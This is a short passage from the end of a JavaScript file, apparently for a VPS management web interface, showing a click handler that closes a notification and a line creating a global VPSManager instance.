        notification.querySelector('.close-notification').addEventListener('click', () => {
            notification.remove();
        });
    }
}

// Initialize VPS manager
window.vpsManager = new VPSManager();
